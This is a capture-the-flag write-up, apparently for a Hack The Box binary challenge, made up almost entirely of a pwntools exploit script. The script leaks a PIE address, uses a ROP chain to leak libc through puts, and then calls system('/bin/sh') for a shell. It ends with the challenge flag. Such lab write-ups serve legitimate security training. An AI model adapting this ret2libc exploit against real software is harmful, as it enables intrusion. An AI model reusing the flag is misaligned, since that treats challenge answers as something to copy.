# Space pirate: Retribution
> Write-up author: jon-brandy
## DESCRIPTION:


> FINAL SCRIPT

```py
from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './sp_retribution'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
#pause()
sh.sendlineafter(b'>> ', b'2')
# sending 7 bytes remembering there's null bytes so will be exact 8.
sh.sendlineafter(b'= ', b'AAAAAAA') 

sh.recvuntil(b'y = AAAAAAA\n')
get = sh.recvline().strip()
print('THIS IS -->',get)

leak = unpack(get.ljust(8,b'\x00'))
#print(leak)
log.success('LEAKED PIE --> %#0x', leak)
elf.address = leak - 3440
log.success('Calculated pie_base --> %#0x', elf.address)

pop_rdi = 0x0000000000000d33
log.success('pop_rdi_gadget --> %#0x', pop_rdi)

calc_rdi = elf.address + pop_rdi
log.success('Calculated pop_rdi gadget --> %#0x', calc_rdi)

padding = 88
p = flat([
    asm('nop') * padding,
    calc_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
])

sh.sendlineafter(b':', p)

sh.recvline()
sh.recvline()

get = sh.recvline().strip()
#print('PUTS -->',get)

leaked_puts = unpack(get.ljust(8,b'\x00'))
log.success('LEAKED PUTS --> %#0x', leaked_puts)

libc.address = leaked_puts - 456352
log.info('LIBC BASE --> %#0x', libc.address)

pay = flat([
    asm('nop') * padding,
    calc_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
])

sh.sendlineafter(b'>>', b'2')
sh.sendlineafter(b'y =', b'')
sh.sendlineafter(b':', pay) 

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/52e1d270-128a-4a2c-9d88-b48edcd6792a)


## FLAG
```
HTB{w3_f1n4lly_m4d3_1t}
```
